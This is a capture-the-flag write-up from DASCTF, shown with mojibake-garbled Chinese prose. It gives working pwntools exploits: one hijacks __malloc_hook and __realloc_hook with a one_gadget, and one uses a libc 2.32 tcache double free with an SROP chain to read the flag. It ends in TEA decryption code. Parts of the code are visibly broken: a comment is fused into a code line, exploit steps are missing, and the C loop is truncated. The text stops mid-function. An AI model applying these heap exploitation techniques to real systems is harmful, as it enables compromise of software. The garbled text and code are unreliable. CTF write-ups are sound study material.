# MAR DASCTFæ˜Žå¾¡æ”»é˜²èµ› PWNã€RE Writeup
##### è¯‘æ–‡å£°æ˜Ž
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŽŸæ–‡ä¸ºå‡†ã€‚
æ¯”èµ›æœ€åŽæ‹¿åˆ°äº†ç¬¬äºŒåï¼ˆå¯†ç ðŸ‘´å¸¦æˆ‘é£žï¼‰ï¼Œä½œä¸ºé˜Ÿä¼ä¸­çš„PWN & REé€‰æ‰‹ï¼Œèµ›åŽå¤çŽ°äº†ä¸€ä¸‹å…¨éƒ¨REé¢˜ç›®å’Œä¸¤é¢˜PWNã€‚
## PWNéƒ¨åˆ†
###  fruitpie
ç¨‹åºä»£ç éžå¸¸ç®€å•ï¼Œç”³è¯·ä¸€ä¸ªä»»æ„sizeçš„å †å—ï¼Œç„¶åŽå‘Šè¯‰ä½ å †å—çš„åœ°å€ï¼Œå¹¶ä¸”è®©ä½ åœ¨å †å—é™„è¿‘å†™å…¥10å­—èŠ‚çš„ã€‚
**è§£é¢˜æ€è·¯**
**1.MMAPç”³è¯·å †å—**
æˆ‘ä»¬çŸ¥é“å½“æˆ‘ä»¬mallocä¸€ä¸ªå¤§çš„å †å—ï¼ˆ0x200000ï¼‰æ—¶å°±ä¼šä½¿ç”¨mmapæ¥åˆ†é…å †å—ï¼Œæ­¤æ—¶å †åœ°å€ç´§æŒ¨libcï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¾“å‡ºçš„å †å—åœ°å€ï¼Œæ¥è®¡ç®—å‡ºlibcçš„åŸºå€ã€‚
**2.Offsetå‘å‰æº¢å‡º**
ç¨‹åºæ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„offsetåšæ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªoffsetå¯¹å †å—é™„è¿‘çš„åœ°å€æ¥å†™å…¥å†…å®¹ã€‚
**3.æ‰“__malloc_hook**
ç”±äºŽé¢˜ç›®æä¾›äº†libcæ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨ç¨‹åºç»“æŸä½ç½®è°ƒç”¨äº†mallocå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æŽ¥æ‰“malloc_hookï¼Œä½†å®žé™…ä¸Šå‘çŽ°æ‰€æœ‰çš„one_gadgetéƒ½æ— æ³•æˆåŠŸæ‰“é€šã€‚å› æ­¤é¢˜ç›®ä¹Ÿç»™äº†10å­—èŠ‚çš„æƒé™ï¼Œä¸ºçš„å°±æ˜¯è®©ä½ é€šè¿‡
**malloc_hooké™„è¿‘çš„** realloc_hookæ¥è°ƒæ•´æ ˆå¸§ã€‚
**4.__realloc_hookè°ƒæ•´æ ˆå¸§**
æˆ‘ä»¬çŸ¥é“åœ¨reallocå‡½æ•°çš„å¼€å¤´å­˜åœ¨ç€éžå¸¸å¤šçš„pushæŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™äº›æŒ‡ä»¤æ¥è°ƒæ•´æ ˆå¸§ï¼Œå¹¶ä¸”è¿™äº›æŒ‡ä»¤éƒ½ä¸ä¼šå½±å“åˆ°ä¹‹åŽè°ƒç”¨__realloc_hook
æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ **realloc_hookçš„åœ°å€å†™å…¥one_gadgetçš„åœ°å€ï¼Œåœ¨** malloc_hookçš„åœ°å€å†™å…¥realloc +
xæ¥è°ƒæ•´æ ˆå¸§ï¼Œåœ¨è¿™é“é¢˜ä¸­xçš„å–å€¼å¯ä»¥æœ‰2, 4, 6, 8, 9ã€‚
PSï¼šè¿™é“é¢˜ç›´æŽ¥ç”¨reallocç¬¦å·æ‰¾åˆ°çš„åœ°å€ä¼¼ä¹Žä¸æ­£ç¡®ï¼Œè¦ç”¨__libc_reallocæ¥å®šä½åœ°å€ã€‚
**EXP**
    from pwn import *
    context.log_level = "debug"
    #r = process('./fruitpie')
    r = remote('54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com', 50102)
    def debug(addr = 0, PIE = True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(r.pid)).readlines()[1], 16)
            print ("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(r, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(r, "b *{}".format(hex(addr)))
    r.sendlineafter("Enter the size to malloc:", str(0x100000))
    r.recvuntil('0x')
    mmap_addr = int(r.recvuntil('\n', drop=True), 16)
    libc_base = mmap_addr - 0x515010
    one = [0x4f365, 0x4f3c2, 0x10a45c]
    log.success("libc_base: " + hex(libc_base))
    realloc_hook_addr = libc_base + 0x3ebc28
    realloc_addr = libc_base + 0x98ca0
    offset = realloc_hook_addr - mmap_addr
    r.sendlineafter("Offset:", hex(offset))
    # gdb.attach(r, "b __libc_realloc")
    r.sendafter("Data:", p64(libc_base + one[2]) + p64(realloc_addr + 2))
    r.interactive()
###  clown
libc2.32èœå•å †é¢˜ï¼Œæ‹¥æœ‰addï¼Œshowï¼Œdeleteä¸‰ç§æ“ä½œï¼Œåœ¨addä¸­å¯ä»¥editå †å—å†…å®¹ã€‚
å¼€äº†æ²™ç®±ï¼Œéœ€è¦ç”¨orw
###  ç¨‹åºåˆ†æž
æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°åœ¨deleteå‡½æ•°ä¸­å­˜åœ¨ï¼Œdeleteä¹‹åŽä¸æ¸…ç©ºçš„æ¼æ´žï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥é€ æˆdouble freeã€‚
åœ¨showå‡½æ•°ä¸­ï¼Œä½¿ç”¨putsè¾“å‡ºå †å—å†…å®¹
åœ¨addå‡½æ•°ä¸­ï¼Œè¦æ±‚å †å—å¤§å°å°äºŽ0x100ï¼Œä¸”å †å—ä¸ªæ•°å°äºŽ0xFF
**è§£é¢˜æ€è·¯**
**1.åˆ©ç”¨unsorted binæ³„éœ²libc**
å…ˆé‡Šæ”¾7ä¸ªchunkæŠŠtcacheå¡«æ»¡ï¼Œç„¶åŽå†é‡Šæ”¾ä¸€ä¸ªchunkè¿›å…¥åˆ°unsorted binï¼ˆæ³¨æ„è¦æœ‰ä¸ªå †å—ä¸Žtop chunkéš”å¼€ï¼‰ï¼Œç”±äºŽåœ¨libc
2.32ä¸‹ main_arena + 88çš„åœ°å€æœ«å°¾æ˜¯\x00ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¦†ç›–æœ€ä½Žå­—èŠ‚æ‰å¯ä»¥ç”¨putsè¾“å‡ºã€‚ï¼ˆè™½ç„¶å¿…é¡»è¦è¦†ç›–ä¸€ä¸ªå­—èŠ‚ï¼‰
**2.åˆ©ç”¨libc2.32æ–°ç‰¹æ€§æ³„éœ²heap base**
ç®€å•çš„æ¥è¯´å°±æ˜¯åœ¨nextä½ç½®ä¼šæœ‰ä¸€ä¸ªkeyä¸ŽnextåŽŸæ¥çš„å†…å®¹è¿›è¡Œå¼‚æˆ–å¹¶ä¿å­˜ï¼Œè¿™ä¸ªkeyçš„åœ°å€å°±æ˜¯nextçš„ä½ç½®å³ç§»12ä½ï¼ˆåŽ»æŽ‰æœ«å°¾12ä½ï¼‰ï¼Œå½“tcacheé“¾ä¸ºç©ºçš„æ—¶å€™ï¼Œå°±æ˜¯0ä¸Žkeyè¿›è¡Œå¼‚æˆ–ï¼Œåœ¨nextçš„ä½ç½®å†…å®¹å°±æ˜¯keyï¼Œæˆ‘ä»¬å¯ä»¥æ³„éœ²è¿™ä¸ªkeyæ¥å¾—åˆ°å †åŸºå€ã€‚
å…³äºŽè¿™ä¸ªç‰¹æ€§çš„è¯¦ç»†ä»‹ç»å¯ä»¥çœ‹æˆ‘çš„åšå®¢ï¼š[http://blog.wjhwjhn.com/archives/186/](http://blog.wjhwjhn.com/archives/186/?fileGuid=K66x6YWJ8jWCqQyC)
**3.é€šè¿‡fastbinæ¥æž„é€ double freeå†åˆ©ç”¨**
ä½†æ˜¯åœ¨libc 2.32ä¸­å¯¹äºŽtcache double
freeçš„æ£€æµ‹æœ‰äº›ä¸¥æ ¼ï¼Œå¹¶ä¸”è¿™é“é¢˜åªæœ‰åœ¨addçš„æ—¶å€™æ‰èƒ½ä¿®æ”¹å †å—ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç”¨fastbinæ¥æž„é€ å‡ºdouble
freeï¼ˆa->b->aï¼‰ï¼Œå†fastbin reverse into
tcacheè¿™ä¸ªæœºåˆ¶è®©fastbinè¿›å…¥åˆ°tcacheä¸­ï¼Œå¹¶ä¸”è¦†ç›–nextå†…å®¹åˆ°tcache
structï¼ˆä¸Žkeyå¼‚æˆ–åŽçš„ç»“æžœï¼‰ï¼Œè®©å•æ¬¡ä»»æ„è¯»å†™æ¼æ´žå˜æˆå¤šæ¬¡ä»»æ„è¯»å†™æ¼æ´žã€‚
**4.åŠ«æŒtcache structçš„å†…å®¹åˆ°__free_hook**
ç”±äºŽä¹‹åŽSROPçš„payloadè¿‡é•¿ï¼Œæ‰€ä»¥è¿˜è¦åˆ†æˆä¸¤æ®µæ¥å†™ã€‚åŒæ—¶éœ€è¦æ³¨æ„æŠŠå¯¹åº”ç”³è¯·å †å—sizeçš„countså˜æˆ1ï¼Œå¦åˆ™æ— æ³•ç”³è¯·å‡ºæ¥ã€‚
**5.ä½¿ç”¨gadgetæ¥å°†rdiå‚æ•°è½¬ç§»åˆ°rdx**
åœ¨ libc2.29 åŠä»¥åŽçš„ç‰ˆæœ¬ï¼Œsetcontext + 61 ä¸­è°ƒç”¨çš„å‚æ•°å˜æˆäº† rdxï¼Œè€Œä¸æ˜¯ rdiï¼Œè¿™ä½¿å¾—æˆ‘ä»¬åœ¨åˆ©ç”¨__free_hook
ä¼ å‚çš„æ—¶å€™ï¼Œæ— æ³•ç›´æŽ¥ä¼ åˆ° setcontext ä¸­ï¼Œè¿™é‡Œæˆ‘ä»¬å°±è¦è€ƒè™‘æ‰¾ä¸€ä¸ª gadget æ¥ä¼ å‚ä½¿å¾— rdi çš„å‚æ•°è½¬å˜åˆ° rdx ä¸Šã€‚
    mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
å¯ä»¥ä½¿ç”¨è¿™ä¸ªgadgetæ¥è½¬ç§»å‚æ•°ï¼Œè¿™ä¸ªæ“ä½œä»¥åŠæåŠå¤šæ¬¡ï¼Œè¿™é‡Œä¸å†å¤è¿°ï¼Œå¦‚æžœæœ‰ç–‘é—®çš„å¯ä»¥çœ‹ä¸€ä¸‹æˆ‘ä¹‹å‰å‘çš„æ–‡ç« ã€‚  
 **6.åœ¨free_hookæ—è¾¹æž„é€ SROP**
è¿™ä¸ªçº¯å±žä¸ºäº†å·æ‡’ï¼Œè®©SROPå’Œå†™__free_hookçš„æ“ä½œæ”¾åˆ°ä¸€èµ·åŽ»ï¼Œè¿™æ ·å°±å¯ä»¥ä¸€æ¬¡æ€§æžå®šæ‰€æœ‰çŽ¯èŠ‚ã€‚ä¸è¿‡æœ€åŽå› ä¸ºsizeé™åˆ¶çš„é—®é¢˜è¿˜æ˜¯åˆ†äº†ä¸¤éƒ¨æ¥å†™ã€‚
æ³¨æ„ï¼šåœ¨libc2.32ä¸­æ–°å¢žäº†ä¸€ä¸ªæ£€æµ‹è¦æ±‚tcacheç”³è¯·çš„å†…å®¹è¦ä¸Ž0x10å¯¹é½ï¼Œå¦åˆ™ä¼šç”³è¯·é”™è¯¯ã€‚
**EXP**
    from pwn import *
    context.log_level = "debug"
    r = process('./clown')
    #r = remote('pwn.machine.dasctf.com', 50501)
    libc = ELF('libc/libc.so.6')
    context.arch = "amd64"
    def choice(idx):
        r.sendafter(">> ", str(idx))
    def add(size, content = 'a'):
        choice(1)
        r.sendafter("Size: ", str(size))
        r.sendafter("Content: ", content)
    def delete(idx):
        choice(2)
        r.sendafter("Index: ", str(idx))
    def show(idx):
        choice(3)
        r.sendafter("Index: ", str(idx))
    #leak libc
    #fill tcache
    for i in range(7):
        add(0x100)
    add(0x100) #7
    add(0x100) #8
    for i in range(7):
        delete(i)
    delete(7) #into unsortedbin
    add(0x80) #9 partial overwrite
    show(7)
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1b7d61
    log.success("libc_base: " + hex(libc_base))
    libc.address = libc_base
    add(0x78) #10
    #leak heap_base
    add(0x68) #11
    delete(11)
    show(11)
    heap_base = u64(r.recvuntil('\nDone', drop=True)[-5:].ljust(8, '\x00'))  tcache struct
    add(0x68, p64((heap_base + 0xF0) ^ (heap_base >> 12))) #28
    add(0x68) #29
    add(0x68) #30
    #counts0 -> 1
    add(0xF8) #31
    delete(31)
    add(0xE8) #32
    delete(32)
    #hijack tcache struct 
    add(0x68, p64(0) + p64(libc.sym['__free_hook'] + 0xF0) + p64(libc.sym['__free_hook'])) #33
    #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    gadget = libc_base + 0x0000000000124990
    pop_rdi_addr = libc_base + 0x00000000000277d6
    pop_rsi_addr = libc_base + 0x0000000000032032
    pop_rdx_addr = libc.address + 0x00000000000c800d
    fake_frame_addr = libc.sym['__free_hook'] + 0x10
    frame = SigreturnFrame()
    frame.rax = 0
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = pop_rdi_addr + 1  # : ret
    rop_data = [
        libc.sym['open'],
        pop_rdx_addr,
        0x100,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        libc.sym['read'],
        pop_rdi_addr,
        fake_frame_addr + 0x200,
        libc.sym['puts']
    ]
    payload = p64(gadget) + p64(fake_frame_addr) + '\x00' * 0x20 + p64(libc.sym['setcontext'] + 53) + str(frame)[0x28:] + "flag\x00\x00\x00\x00" + p64(0) + str(flat(rop_data))
    add(0xF8, payload[:0xF0]) #34 write to __free_hook part1
    add(0xE8, payload[0xF0:]) #35 write to __free_hook part2
    delete(34)
    r.interactive()
## REéƒ¨åˆ†
###  drinkSomeTea
ä¸å¤ªå®¹æ˜“å‘çŽ°çš„é­”æ”¹Tea
**åŽ»é™¤èŠ±æŒ‡ä»¤**
è§‚å¯Ÿä¸»å‡½æ•°ï¼Œå‘çŽ°æœ‰ä¸ªè°ƒç”¨çš„å‡½æ•°æ— æ³•æ­£å¸¸è¯†åˆ«ï¼Œæ— æ³•æŸ¥çœ‹ä¼ªä»£ç ã€‚
è§‚å¯Ÿæ±‡ç¼–åŽå‘çŽ°å­˜åœ¨èŠ±æŒ‡ä»¤ï¼ŒäºŽæ˜¯æˆ‘ä»¬è€ƒè™‘æ‰‹åŠ¨åŽ»é™¤ã€‚
å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä»£ç ä¸­ä¸€å®šä¼šè·³è½¬åˆ°åœ°å€æ˜¯401117ï¼Œä½†æ˜¯IDAå´è¢«è¯¯å¯¼ä»Ž401116å¼€å§‹æ±‡ç¼–å¯¼è‡´åŽç»­æ±‡ç¼–å‡ºé”™ã€‚
æˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ä¸ŠæŒ‰Dé”®è½¬æ¢ä¸ºæ•°æ®ã€‚
ç„¶åŽæ‰‹åŠ¨åœ¨401117ä½ç½®æŒ‰Cé”®è½¬åŒ–ä¸ºä»£ç ã€‚
å¯ä»¥å‘çŽ°åœ¨401116ä½ç½®å¤šå‡ºäº†ä¸€ä¸ª0xE8ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Patchå·¥å…·ä¿®æ”¹ä¸º0x90ï¼ˆnopï¼‰æŒ‡ä»¤
å†åˆ°å‡½æ•°å¤´éƒ¨æŒ‰Pé”®è¯†åˆ«ä¸ºå‡½æ•°
**TEA encodeå‡½æ•°**
ä¹‹åŽå°±å¯ä»¥F5æŸ¥çœ‹ä¼ªä»£ç äº†
ç¨å¾®è¿›è¡Œä¸€ä¸‹é‡å‘½åå°±å¯ä»¥å‘çŽ°è¿™æ˜¯ä¸ªå¾ˆæ ‡å‡†çš„teaåŠ å¯†å‡½æ•°ï¼Œé‚£ä¹ˆä½ å°±æŽ‰è¿›è¿™ä¸ªå‘é‡Œäº†ï¼Œä»”ç»†è§‚å¯Ÿå˜é‡ç±»åž‹éƒ½æ˜¯intï¼Œä½†æ˜¯åœ¨å¸¸è§„çš„teaåŠ å¯†å‡½æ•°ä¸­åº”è¯¥æ˜¯ç”¨unsigned
intæ¥å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œæ‰€ä»¥å¯¼è‡´ä¸€èˆ¬ç½‘ä¸Šçš„teaè§£å¯†è„šæœ¬æ— æ³•ä½¿ç”¨ï¼Œéœ€è¦æ‰‹åŠ¨ä¿®æ”¹ç±»åž‹ä¸ºintï¼Œä¸¤è€…åœ¨ç¬¦å·è¿ç®—çš„è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€å®šåŒºåˆ«å¯¼è‡´ç¨‹åºæ— æ³•æ­£ç¡®çš„è®¡ç®—ã€‚
**ä¸»å‡½æ•°é€»è¾‘**
åœ¨mainå‡½æ•°ä¸­çš„é€»è¾‘éžå¸¸æ¸…æ™°ï¼Œå¤§æ¦‚å°±æ˜¯è¯»å…¥tea.pngæ–‡ä»¶ï¼Œç„¶åŽæ¯8å­—èŠ‚è¿›è¡Œä¸€æ¬¡åŠ å¯†ï¼Œæœ€åŽè¾“å‡ºåˆ°tea.png.outæ–‡ä»¶ä¸­ï¼Œå¯¹åº”çš„teaåŠ å¯†keyå°±æ˜¯é‚£ä¸ªfake
flagäº†ï¼Œæˆ‘ä»¬çŽ°åœ¨æœ‰äº†åŠ å¯†åŽçš„æ•°æ®ï¼Œåªéœ€è¦ç¼–å†™è§£å¯†ä»£ç å³å¯å¾—åˆ°å›¾ç‰‡ã€‚
**è§£é¢˜ä»£ç **
    #include 
    #include 
    void encrypt(int* v, const unsigned int* k)
    {
        int v0 = v[0], v1 = v[1], sum = 0, i;
        int delta = 0x9E3779B9;
        int k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
        for (i = 0; i > 5) + k1);
            v1 += ((v0 > 5) + k3);
        }
        v[0] = v0;
        v[1] = v1;
    }
    void decrypt(int* v, unsigned int* k)
    {